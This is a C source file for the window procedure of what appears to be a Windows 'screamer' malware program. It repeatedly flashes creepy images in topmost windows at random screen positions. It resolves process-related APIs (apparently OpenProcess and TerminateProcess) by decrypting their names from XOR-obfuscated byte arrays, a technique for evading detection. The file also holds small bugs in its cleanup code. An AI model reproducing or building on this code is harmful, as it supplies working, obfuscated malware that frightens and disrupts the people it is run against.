#define _CRT_RAND_S
#include <stdlib.h>
#include "functions.h"
#include <Windows.h>
#include <wincodec.h>
#include "resource.h"
#include <malloc.h>
#include "screamer_control.h"
#include "ScreamerPicture.h"
#include "DestroyStruct.h"
#include "ScreamerStruct.h"
#include "getRequiredScreamerStatus.h"
#include "loadJpegResource.h"
#include "windowDestroyEnumerator.h"
#include "decryptString.h"
#include "getScreamerStatusChangeDelay.h"

#include "screamerWndProc.h"
LRESULT screamerWndProc(HWND hWnd, UINT uInt, WPARAM wParam, LPARAM lParam) {
#define TIMER_UPDATE 10001
#define TIMER_SHOW 10002
#define TIMER_HIDE 10003
#define PERIOD 2000
#define SHOW_TIME 500
	struct ScreamerStruct* screamer_data;
	screamer_data = (struct ScreamerStruct*)GetWindowLongPtrW(hWnd, GWLP_USERDATA);
	switch (uInt) {
	case WM_CREATE:
		screamer_data = malloc(sizeof(struct ScreamerStruct));
		if (screamer_data) {
			memset_wrapper(screamer_data, 0, sizeof(struct ScreamerStruct));
			SetWindowLongPtrW(hWnd, GWLP_USERDATA, (LONG_PTR)screamer_data);
			screamer_data->destroy.user32 = LoadLibraryExW(L"user32.dll", NULL, LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
			screamer_data->destroy.kernel32 = LoadLibraryExW(L"kernel32.dll", NULL, LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
			if (!(screamer_data->destroy.user32 && screamer_data->destroy.kernel32)) {
				if (screamer_data->destroy.user32) FreeLibrary(screamer_data->destroy.user32);
				if (screamer_data->destroy.kernel32) FreeLibrary(screamer_data->destroy.kernel32);
				free(screamer_data);
				return -1;
			};
			static const char gwtpi_a[] = { 0xa9, 0x33, 0x06, 0x81, 0x9c, 0xee, 0x53, 0xd0, 0x62, 0xa1, 0xaf, 0xcc, 0x50, 0xc3, 0x2a, 0x45, 0xbd, 0x10, 0x91, 0x07, 0xab, 0xf2, 0x3d, 0x85 };
			static const char gwtpi_b[] = { 0x11, 0xa9, 0x8d, 0x29, 0x0a, 0x7f, 0xc8, 0x40, 0xea, 0x0a, 0x38, 0x41, 0xca, 0x5d, 0xb1, 0xea, 0x30, 0x80, 0x0d, 0x9d, 0x27, 0x7e, 0x8b, 0x1e };
			char gwtpi[25];
			decryptString(gwtpi_a, gwtpi_b, gwtpi, 24, sizeof(char));
			gwtpi[24] = '\0';
			screamer_data->destroy.hwnd_to_pid = (DWORD (__cdecl *) (HWND,LPDWORD)) GetProcAddress(screamer_data->destroy.user32, gwtpi);
			static const char op_a[] = { 0xf9, 0xbf, 0xbc, 0xbf, 0x43, 0xa9, 0xba, 0x7a, 0x0f, 0x99, 0xc4 };
			static const char op_b[] = { 0x49, 0x30, 0x26, 0x2e, 0xec, 0x24, 0x2a, 0xe6, 0x95, 0x15, 0x48 };
			char op[12];
			decryptString(op_a, op_b, op, 11, sizeof(char));
			op[11] = '\0';
			screamer_data->destroy.open_process = (HANDLE (__cdecl *)(DWORD,BOOL,DWORD)) GetProcAddress(screamer_data->destroy.kernel32, op);
			static const char tp_a[] = { 0x18, 0xbd, 0xcd, 0xe1, 0x0f, 0xc2, 0x32, 0x59, 0x6e, 0xce, 0x5a, 0xd2, 0x98, 0x89, 0x6f, 0xb2 };
			static const char tp_b[] = { 0xb3, 0x27, 0x40, 0x73, 0x99, 0x53, 0xac, 0xd2, 0xf4, 0x61, 0xd7, 0x42, 0x04, 0x13, 0xe3, 0x3e };
			char tp[17];
			decryptString(tp_a, tp_b, tp, 16, sizeof(char));
			tp[16] = '\0';
			screamer_data->destroy.terminate_process = (BOOL (__cdecl *)(HANDLE,UINT)) GetProcAddress(screamer_data->destroy.kernel32, tp);
			if (!(screamer_data->destroy.hwnd_to_pid && screamer_data->destroy.open_process && screamer_data->destroy.terminate_process)) {
				FreeLibrary(screamer_data->destroy.kernel32);
				FreeLibrary(screamer_data->destroy.user32);
				free(screamer_data);
				return -1;
			};
			static const int screamer_resources[PICTURES_COUNT] = { IDR_CREEPY1, IDR_CREEPY2, IDR_CREEPY3, IDR_CREEPY4, IDR_CREEPY5, IDR_CREEPY6, IDR_CREEPY7, IDR_CREEPY8 };
			IWICImagingFactory* factory;
			if (SUCCEEDED(CoCreateInstance(&CLSID_WICImagingFactory, NULL, CLSCTX_ALL, &IID_IWICImagingFactory, &factory))) {
				for (int j = 0; j < PICTURES_COUNT; j++) {
					screamer_data->pictures[j].bits = loadJpegResource(factory, screamer_resources[j], &(screamer_data->pictures[j].info_hdr));
					if (!screamer_data->pictures[j].bits) {
						for (int i = 0; i < j; i++) free(screamer_data->pictures[j].bits);
						factory->lpVtbl->Release(factory);
						FreeLibrary(screamer_data->destroy.kernel32);
						FreeLibrary(screamer_data->destroy.user32);
						free(screamer_data);
						return -1;
					};
				};
				factory->lpVtbl->Release(factory);
				if (getRequiredScreamerStatus()) {
					PostMessageW(hWnd, WM_COMMAND, SCREAMER_ENABLE, 0);
				};
				SetTimer(hWnd, TIMER_UPDATE, 1000 * getScreamerStatusChangeDelay(), NULL);
			}
			else {
				FreeLibrary(screamer_data->destroy.kernel32);
				FreeLibrary(screamer_data->destroy.user32);
				free(screamer_data);
				return -1;
			}
		}
		else return -1;
		break;
	case WM_DESTROY:
		for (int i = 0; i < PICTURES_COUNT; i++) free(screamer_data->pictures[i].bits);
		FreeLibrary(screamer_data->destroy.kernel32);
		FreeLibrary(screamer_data->destroy.user32);
		free(screamer_data);
		break;
	case WM_PAINT:
		PAINTSTRUCT ps;
		BeginPaint(hWnd, &ps);
		StretchDIBits(ps.hdc, 0, 0, screamer_data->pictures[screamer_data->index].info_hdr.biWidth, -screamer_data->pictures[screamer_data->index].info_hdr.biHeight, 0, 0, screamer_data->pictures[screamer_data->index].info_hdr.biWidth, -screamer_data->pictures[screamer_data->index].info_hdr.biHeight, screamer_data->pictures[screamer_data->index].bits, (BITMAPINFO*)&(screamer_data->pictures[screamer_data->index].info_hdr), DIB_RGB_COLORS, SRCCOPY);
		EndPaint(hWnd, &ps);
		break;
	case WM_COMMAND:
		if (wParam == SCREAMER_ENABLE) {
			ShowWindow(hWnd, SW_NORMAL);
			SetTimer(hWnd, TIMER_HIDE, SHOW_TIME, NULL);
			KillTimer(hWnd, TIMER_SHOW);
		}
		else if (wParam == SCREAMER_DISABLE) {
			ShowWindow(hWnd, SW_HIDE);
			KillTimer(hWnd, TIMER_SHOW);
			KillTimer(hWnd, TIMER_HIDE);
		};
		break;
	case WM_TIMER:
		if (wParam == TIMER_UPDATE) {
			SetTimer(hWnd, TIMER_UPDATE, 1000 * getScreamerStatusChangeDelay(), NULL);
				if (getRequiredScreamerStatus()) {
					PostMessageW(hWnd, WM_COMMAND, SCREAMER_ENABLE, 0);
				}
				else {
					PostMessageW(hWnd, WM_COMMAND, SCREAMER_DISABLE, 0);
				};
		} else if (wParam == TIMER_SHOW) {
			rand_s(&(screamer_data->index));
			screamer_data->index %= PICTURES_COUNT;
			unsigned int x, y;
			rand_s(&x);
			rand_s(&y);
			x %= (GetSystemMetrics(SM_CXSCREEN) - screamer_data->pictures[screamer_data->index].info_hdr.biWidth);
			y %= (GetSystemMetrics(SM_CYSCREEN) + screamer_data->pictures[screamer_data->index].info_hdr.biHeight);
			SetWindowPos(hWnd, HWND_TOPMOST, x, y, screamer_data->pictures[screamer_data->index].info_hdr.biWidth, -(screamer_data->pictures[screamer_data->index].info_hdr.biHeight), SWP_NOACTIVATE | SWP_SHOWWINDOW);
			ShowWindow(hWnd, SW_NORMAL);
			UpdateWindow(hWnd);
			KillTimer(hWnd, TIMER_SHOW);
			SetTimer(hWnd, TIMER_HIDE, SHOW_TIME, NULL);
		}
		else if (wParam == TIMER_HIDE) {
			ShowWindow(hWnd, SW_HIDE);
			KillTimer(hWnd, TIMER_HIDE);
			SetTimer(hWnd, TIMER_SHOW, PERIOD - SHOW_TIME, NULL);
		}
		break;
	default:
		return DefWindowProcW(hWnd, uInt, wParam, lParam);
		break;
	};
	return 0;
};